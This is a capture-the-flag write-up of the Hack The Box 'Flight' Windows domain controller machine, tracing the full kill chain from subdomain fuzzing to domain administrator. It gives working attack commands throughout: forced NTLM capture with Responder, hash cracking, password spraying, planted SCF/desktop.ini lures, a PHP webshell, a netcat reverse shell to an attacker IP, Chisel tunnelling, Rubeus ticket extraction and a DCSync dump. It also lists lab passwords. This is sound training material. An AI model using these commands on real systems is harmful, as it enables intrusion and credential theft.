| Syntropy Intel: 🧠 [Mental Model](../../../00-Mental-Models/The-Watering-Hole-Principle.md) | 🛡️ [Detection Rules](../../../02-Detection-Engineering/Detection-Flight-Artifacts.md) |

# Hack The Box (HTB) Flight Machine Writeup | [54nK4lP3x3]

**Hack the Box machine walkthrough of [HTB Flight](https://app.hackthebox.com/machines/Flight) by: [54nK4lP3x3](https://github.com/Sanka1pp)**


## 1. Executive Summary

**Objective:** Compromise the "Flight" Domain Controller to achieve total domain dominance.
**Outcome:** **Critical Compromise** (Domain Admin Authority Achieved).

**The Kill Chain:**
1.  **Recon:** Discovery of `school.flight.htb` and an LFI vector via the `view` parameter.
2.  **Credential Theft:** Exploiting LFI to force NTLM authentication to a rogue SMB listener (`Responder`).
3.  **Lateral Movement:** Identifying a writable share (`Shared`) accessed by other users and deploying a "Watering Hole" attack.
4.  **Foothold:** Abusing write access to the `Web` share to deploy a PHP backdoor.
5.  **Tunneling:** Establishing a `Chisel` tunnel to access the internal development IIS server on Port 8000.
6.  **Privilege Escalation:** Uploading an ASPX webshell to `C:\inetpub\development`, escalating to `IIS AppPool\DefaultAppPool`.
7.  **Domain Dominance:** Abusing `SeImpersonatePrivilege` via `Rubeus tgtdeleg` to request a TGT, dumping the Administrator's NTLM hash.

---

## 2. Reconnaissance: The Open Sky

### Port Scanning
We began with a comprehensive Nmap scan to identify the attack surface. The results indicated a standard Windows Domain Controller environment.

```bash
nmap -sC -sV -p- 10.129.228.120
```
_Figure 1: Initial Nmap scan revealing Domain Controller services (53, 88, 445)._

### Subdomain Enumeration

Port 80 hosted a generic airline travel portal (`flight.htb`). Standard enumeration revealed no obvious vulnerabilities. However, aggressive subdomain fuzzing uncovered a hidden educational portal.

Bash

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u [http://flight.htb](http://flight.htb) -H "Host: FUZZ.flight.htb" -fw 1234

```

_Figure 2: Discovery of the `school.flight.htb` subdomain._

Adding this to our `/etc/hosts` file allowed us to access the new application.

_Figure 3: The `school.flight.htb` interface._

----------

## 3. The Entry Point: LFI to NTLM Theft

### Vulnerability Identification

Navigating the `school.flight.htb` site, we observed a URL structure that suggested dynamic file loading: `index.php?view=home.html`.

We tested for **Local File Inclusion (LFI)** by attempting to traverse the directory structure. While direct file reading (e.g., `../../../../windows/win.ini`) appeared blocked or sanitized, the application was still attempting to resolve file paths.

_Figure 4: The vulnerable `view` parameter._

### Exploiting LFI for Forced Authentication

Since we couldn't read files directly, we pivoted to **Remote File Inclusion (RFI)** logic to force the server to authenticate to us. We set up `Responder` to listen for incoming SMB connections.

**Attack Command:**


```
sudo responder -I tun0

```

**Trigger:** We pointed the vulnerable `view` parameter to our attacker IP via a UNC path: `http://school.flight.htb/index.php?view=//10.10.16.160/fakeshare`

_Figure 5: Successfully capturing the NTLMv2 hash for `flight\svc_apache`._

### Cracking the Hash

With the hash captured, we utilized `hashcat` to recover the plaintext password.

Bash

```
hashcat -m 5600 svc_apache_hash.txt /usr/share/wordlists/rockyou.txt

```

**Credentials Recovered:**

-   **User:** `flight\svc_apache`
    
-   **Password:** `S@Ss!K@*t13`
    

_Figure 6: Cracking the service account password._

---

## 4. Lateral Movement: The Watering Hole Attack

### Password Spraying & Reuse
With the credentials `svc_apache:S@Ss!K@*t13`, we first attempted to verify their access. Using `CrackMapExec` (or `NetExec`), we sprayed this password against the domain to see if it was reused by other accounts.

```bash
netexec smb 10.129.228.120 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
```
**Discovery:** The user **`S.Moon`** reuses the same password. This provided us a valid domain user context.

_Figure 7: Identifying password reuse for `S.Moon`._

### SMB Enumeration (The Trap)

Logged in as `S.Moon`, we enumerated the available SMB shares.


```
smbclient -L //10.129.228.120 -U S.Moon

```

We discovered a non-standard share named **`Shared`**. Listing its permissions revealed that our user had **Write Access**.

_Figure 8: Discovery of the writable `Shared` folder._

### The Watering Hole Strategy

A writable share visited by other users is a classic "Watering Hole." We didn't need to exploit a complex vulnerability; we just needed to place a file that would force a connection back to us when browsed.

We used **`ntlm_theft`** to generate a malicious `.scf` (Shell Command File) and `desktop.ini`. These files command Windows Explorer to load an icon from a remote server (our attacker machine).

**Payload Generation:**

Bash

```
python3 ntlm_theft.py -g all -s 10.10.16.160 -f theft

```

_Figure 9: Generating the hash theft payloads._

**Planting the Trap:** We uploaded the generated files to the `Shared` directory.

```
smbclient //10.129.228.120/Shared -U S.Moon
put desktop.ini
put flight.scf

```

_Figure 10: Uploading the malicious files to the writable share._

### Capture & Crack (C.Bum)

We restarted `Responder` and waited. Within minutes, the user **`C.Bum`** browsed the share, triggering the icon load and sending their NTLMv2 hash to our listener.

**Credentials Recovered:**

-   **User:** `flight\C.Bum`
    
-   **Hash:** `(Captured via Responder)`
    

_Figure 11: Capturing `C.Bum`'s NTLMv2 hash._

We cracked this hash using `hashcat` with the `rockyou.txt` wordlist.

-   **Password:** `Tikkycoll_431012284`
    

_Figure 12: Cracking the `C.Bum` password._

---

## 5. Foothold: From Share to Shell

### Webroot Compromise
Armed with `C.Bum`'s credentials (`Tikkycoll_431012284`), we enumerated their permissions further. We discovered they had **Write Access** to a share named `Web`.

```bash
smbclient //10.129.228.120/Web -U C.Bum
```
Listing the contents confirmed this was the **Webroot** for `flight.htb` (`C:\inetpub\wwwroot\flight.htb`). This is a critical misconfiguration: we could write files that the web server would execute.

_Figure 13: Identifying the writable `Web` share._

### Staging the Payload

We prepared two files:

1.  **`nc64.exe`**: A static Netcat binary for Windows.
    
2.  **`revshl.php`**: A simple PHP webshell to execute system commands.
    
```
<?php system($_GET['c']); ?>

```

We uploaded both files to the `Web` share via SMB.

```
put nc64.exe
put revshl.php
```
_Figure 14: Uploading the backdoor and netcat binary._

### Execution & Shell

With the files in place, we triggered the execution via `curl`. We instructed the PHP shell to run `nc64.exe` and connect back to our listener.

**Listener:**

```
nc -nvlp 9001

```

**Trigger:**

```
curl -G [http://flight.htb/revshl.php](http://flight.htb/revshl.php) --data-urlencode "c=nc64.exe -e cmd.exe 10.10.16.160 9001"
```

**Result:** We received a reverse shell as `flight\svc_apache`.

_Figure 15: Successful reverse shell execution._

----------

## 6. Tunneling: The Internal Pivot

### Internal Reconnaissance

Once inside, we ran `netstat -an` to look for internal services. We identified **Port 8000** listening on `127.0.0.1`. This port was blocked from the outside.

```
netstat -an | findstr "LISTENING"

```

_Figure 16: Discovery of the internal HTTP service on Port 8000._

### Establishing the Chisel Tunnel

To access this internal service, we set up a **SOCKS Tunnel** using `Chisel`.

**1. Attack Machine (Server):**

```
./chisel server -p 8000 --reverse

```

**2. Target Machine (Client):** We uploaded the `chisel_client.exe` to `C:\ProgramData` (a world-writable directory) and executed it.

```
.\chisel_client.exe client 10.10.16.160:8000 R:8001:127.0.0.1:8000

```

_Logic: "Connect to my attacker box on port 8000. Forward my local port 8001 to the target's internal port 8000."_

_Figure 17: Establishing the reverse tunnel._

### Accessing the Internal Site

We configured our browser (or FoxyProxy) to use the tunnel, or simply accessed `http://localhost:8001` if using port forwarding. This revealed a **Development Site** hosted internally.

_Figure 18: Accessing the internal Development portal via the tunnel._

---

## 7. Privilege Escalation: The Service Account

### The Development Site
Through our tunnel (Port 8000), we accessed the internal web application. Enumeration revealed its physical path was likely `C:\inetpub\development`.

We checked permissions on this folder using `icacls`.

```cmd
icacls C:\inetpub\development
```
**Discovery:** The user **`C.Bum`** (whose credentials we have) has **Write Access** to this directory.

_Figure 19: Confirming write access to the internal development folder._

### Webshell Upload & Execution

We generated an ASPX webshell (`tunneled_payload.aspx`) to execute commands as the application pool identity.

**Upload:** We used SMB (via `C.Bum`) to place the shell in the `development` folder.

```
smbclient //10.129.228.120/Web -U C.Bum
cd development
put tunneled_payload.aspx

```

**Trigger:** We accessed the shell through our Chisel tunnel: `http://localhost:8001/tunneled_payload.aspx`

**Result:** We obtained command execution as **`iis apppool\defaultapppool`**.

_Figure 20: Execution as the IIS Service Account._

----------

## 8. Domain Dominance: The Potato Attack

### Privilege Analysis

Running `whoami /priv` on our new shell revealed a critical privilege:

-   **`SeImpersonatePrivilege`**: Enabled.
    

This privilege allows a service to impersonate any user who connects to it. While traditional "Potato" exploits (JuicyPotato, PrintSpoofer) are often patched or detected, we utilized **`Rubeus`** to perform a Kerberos-based variant known as `tgtdeleg`.

_Figure 21: Confirming `SeImpersonatePrivilege`._

### Rubeus TGT Delegation

We uploaded `Rubeus.exe` to the target and executed the `tgtdeleg` command. This trick asks the Domain Controller for a TGT (Ticket Granting Ticket) for the current user, which `Rubeus` then extracts from memory.

```
.\Rubeus.exe tgtdeleg /nowrap

```

**Output:** Rubeus returned a base64-encoded Kerberos ticket (Kirbi format).

_Figure 22: Extracting the TGT via Rubeus._

### Ticket Manipulation & DCSync

We took this base64 blob back to our attacker machine to perform the final steps.

**1. Decode the Ticket:**

```
echo "doIFujCCBbWgAwIBBaEDAgEW..." | base64 -d > flight_iis.kirbi

```

**2. Convert to CCache:** We converted the Windows ticket format (Kirbi) to a Linux-usable format (CCache) using `impacket-ticketConverter` (or `kirbi2ccache`).

```
impacket-ticketConverter flight_iis.kirbi flight_iis.ccache

```

**3. Inject into Session:** We exported the ticket into our environment variable so Impacket tools would use it.

```
export KRB5CCNAME=flight_iis.ccache

```

**4. Synchronize Time:** Kerberos is time-sensitive. We synced our clock with the target.

```
sudo rdate -n 10.129.228.120

```

**5. The Final Dump (DCSync):** With a valid TGT for the machine account (which has replication rights), we performed a DCSync attack to dump the **Administrator's NTLM hash**.


```
impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user administrator

```

_Figure 23: Dumping the Administrator NTLM hash._
